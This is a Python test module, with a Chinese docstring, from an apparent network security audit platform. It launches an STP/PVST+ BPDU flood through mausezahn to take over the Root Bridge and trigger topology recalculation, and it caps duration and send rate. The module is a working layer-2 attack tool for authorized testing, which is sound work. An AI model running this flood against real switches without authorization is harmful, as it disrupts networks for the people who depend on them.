"""
測項：STP/PVST+ BPDU 洪水攻擊（Root Bridge 篡奪／拓樸變更觸發，mausezahn）
分類：網路層 (ARP/ICMP/IGMP/LLDP)（L2，無埠號概念）

背景：Spanning Tree Protocol（STP，IEEE 802.1d）交換器會依據收到的 BPDU
    （Bridge Protocol Data Unit）內容互相協商出一台 Root Bridge，並以此為基礎
    計算整個網路的無迴圈拓樸。若攻擊端在網路上持續送出「宣稱自己優先權更高」
    的 BPDU，多數交換器會依照標準協定行為切換 Root Bridge 到攻擊端，進而觸發
    全網拓樸重新收斂（topology change），造成短暫大規模斷線、次優路徑、甚至
    在設備支援度不佳時造成持續性的拓樸抖動（flapping）。這是業界公認的經典
    L2 層攻擊面之一（Root Bridge takeover / BPDU flood），本測項與既有的
    netlayer/arp_request_flood.py、icmp_echo_flood.py、igmp_flood.py、
    lldp_frame_flood.py 同屬一個分類，補上尚未涵蓋的 STP/PVST+ 攻擊面。

與既有 netlayer 測項的差異（重要）：既有 4 個 netlayer 測項全部是
    用 scapy 手刻封包送出；本測項改用 mausezahn（Debian/Kali 套件名稱
    netsniff-ng 內含）這套成熟、專門設計來產生協定測試封包的工具，而非手刻
    BPDU bytes。這是刻意的設計選擇：BPDU 欄位（root id、bridge id、path cost、
    timer 等）遠比 ARP/ICMP 複雜，用久經驗證的工具比自行組 bytes 更不容易在
    欄位對齊/checksum 等細節上出錯，且 mausezahn 本身即是 Kali Linux 官方工具
    目錄收錄的套件，安裝風險低。

需求套件：apt-get install netsniff-ng（提供 mausezahn 執行檔）。此為 Kali/
    Debian 官方套件庫收錄的套件，非第三方來源，安裝失敗機率低；若目標環境無法
    安裝，本測項的健康檢查會偵測不到 mausezahn 執行檔並自動停用本測項，不影響
    其他測項安裝/執行。

CLI 語法依據：mausezahn 0.6.8（隨 netsniff-ng 0.6.8-3build2）內建的
    `mausezahn -t bpdu help` 官方參數說明如下：
        mausezahn <iface> -c <count> -d <delay> -t bpdu <conf|tcn>[, 參數...]
        參數：id, version, type, flags, rootid=<pri>:<mac>, rootpc, bid=<mac>,
              pid, age, maxage, hello, fwd, tag, vlan（PVST+）, pri（802.1P CoS）,
              notag
        預設行為（工具原文）："mz sends standard IEEE 802.1d (CST) BPDUs and
        assumes that your computer wants to become the root bridge (rid=bid)."
    本測項僅使用上述參數集中的 vlan、hello、fwd、maxage、conf/tcn 關鍵字，
    未使用/未開放 rootid、bid 等進階欄位的自訂覆寫（這些欄位若填錯格式可能導致
    mausezahn 直接報錯或送出格式不正確的 BPDU，因此本平台選擇只暴露穩定可用的
    最小參數集，而非開放全部欄位）；工具保留其「預設宣稱自己為 Root Bridge」
    的原生行為（即 root id = bridge id = 本機 MAC），這正是本測項要測試的核心
    攻擊行為。

安全設計：
    1. duration 一律經過 clamp_duration() 限制在 1~1800 秒。
    2. 送出頻率透過 interval_sec（對應 mausezahn -d）控制，預設每 2 秒 1 個
       BPDU（貼近真實 STP Hello Timer 的正常頻率量級，非无限全速洪水），使用者
       可視稽核目的調整但有上限（不開放 0 延遲/無限全速）。
    3. 透過 run_subprocess()（-c 0 = 持續送出直到平台依 duration 強制終止）
       啟動，可被 stop_event 中斷、逾時自動終止、stdout 即時回拋前端 log。
    4. 不做 IP/MAC 位址詐騙以外的行為——BPDU 攻擊的本質就是「用自己的
       MAC 位址」宣稱優先權更高，符合 STP 協定本身允許的正常訊息格式，不涉及
       偽造他人 IP/MAC（-a/-b 皆使用 mausezahn 預設值：本機介面 MAC / STP
       群播位址），不同於平台安全規則第 4 點所禁止的「IP/MAC 詐騙他人身份」。
    5. 僅在 L2 廣播網段內有效（BPDU 只在同一個 L2 網域內傳播，不會跨路由），
       執行前請確認測試網段內的交換器確實是被授權測試的範圍。

需求權限：mausezahn 需要 root 或 CAP_NET_RAW 權限才能送出 raw L2 frame，
    與既有 netlayer 測項相同。
"""
from ..common import clamp_duration, run_subprocess

NAME = "STP/PVST+ BPDU 洪水攻擊（Root Bridge 篡奪，mausezahn）"
CATEGORY = "網路層 (ARP/ICMP/IGMP/LLDP)"
PROTOCOL = "L2"
TEST_TYPE = "traffic"  # 靠持續送出 BPDU 觸發目標交換器不斷重算拓樸，屬洪水/流量型


def get_param_schema() -> dict:
    return {
        "iface": {
            "type": "string", "default": "eth0",
            "desc": "發送用網路介面（需與目標交換器同一個 L2 廣播網段）",
        },
        "interval_sec": {
            "type": "float", "default": 2.0, "min": 0.2, "max": 10.0,
            "desc": "BPDU 發送間隔秒數（對應 mausezahn -d；預設 2 秒貼近真實 STP "
                    "Hello Timer 量級，數值越小攻擊越積極但也越容易被異常偵測發現）",
        },
        "bpdu_type": {
            "type": "string", "default": "conf", "options": ["conf", "tcn"],
            "desc": "conf=Configuration BPDU（持續宣告拓樸資訊，預設會嘗試搶當 Root Bridge，"
                    "為此測項的主要模擬情境）；tcn=Topology Change Notification"
                    "（觸發目標交換器認為拓樸有變化而重新計算，屬另一種干擾手法）",
        },
        "vlan": {
            "type": "int", "default": 0, "min": 0, "max": 4094,
            "desc": "0=標準 IEEE 802.1d BPDU（Common Spanning Tree）；1-4094=改用 "
                    "PVST+ 模式對指定 VLAN 發送（Cisco 環境每 VLAN 各自跑一份 STP 時常見）",
        },
        "hello_sec": {
            "type": "int", "default": 2, "min": 1, "max": 10,
            "desc": "BPDU 內宣告的 Hello Time 欄位值（秒），影響目標對此 Root Bridge 的逾時判斷",
        },
        "max_age_sec": {
            "type": "int", "default": 20, "min": 6, "max": 40,
            "desc": "BPDU 內宣告的 Max Age 欄位值（秒）",
        },
        "forward_delay_sec": {
            "type": "int", "default": 15, "min": 4, "max": 30,
            "desc": "BPDU 內宣告的 Forward Delay 欄位值（秒）",
        },
    }


def run(target, port, protocol, duration, params, stop_event, log_fn):
    duration = clamp_duration(duration)
    iface = str(params.get("iface", "eth0")).strip() or "eth0"
    interval_sec = float(params.get("interval_sec", 2.0))
    interval_sec = max(0.2, min(interval_sec, 10.0))
    bpdu_type = str(params.get("bpdu_type", "conf")).strip().lower()
    if bpdu_type not in ("conf", "tcn"):
        bpdu_type = "conf"
    vlan = int(params.get("vlan", 0))
    vlan = max(0, min(vlan, 4094))
    hello = int(params.get("hello_sec", 2))
    maxage = int(params.get("max_age_sec", 20))
    fwd = int(params.get("forward_delay_sec", 15))

    arg_parts = [bpdu_type, f"hello={hello}", f"maxage={maxage}", f"fwd={fwd}"]
    if vlan:
        arg_parts.append(f"vlan={vlan}")
    arg_string = ", ".join(arg_parts)

    # -d 支援秒為單位的 "Nsec" 寫法（見 mausezahn -h），避免手動換算成 usec 造成誤差
    delay_str = f"{interval_sec}sec"

    cmd = ["mausezahn", iface, "-c", "0", "-d", delay_str, "-t", "bpdu", arg_string]

    log_fn(
        f"[+] 啟動 mausezahn STP/PVST+ BPDU 洪水：介面={iface}, 類型={bpdu_type}, "
        f"間隔={interval_sec}s, vlan={vlan or '(未啟用 PVST+)'} "
        f"（預設宣稱自身為 Root Bridge，將於 {duration} 秒後由平台強制終止）"
    )
    result = run_subprocess(cmd, duration, stop_event, log_fn)
    result["iface"] = iface
    result["bpdu_type"] = bpdu_type
    result["vlan"] = vlan
    return result
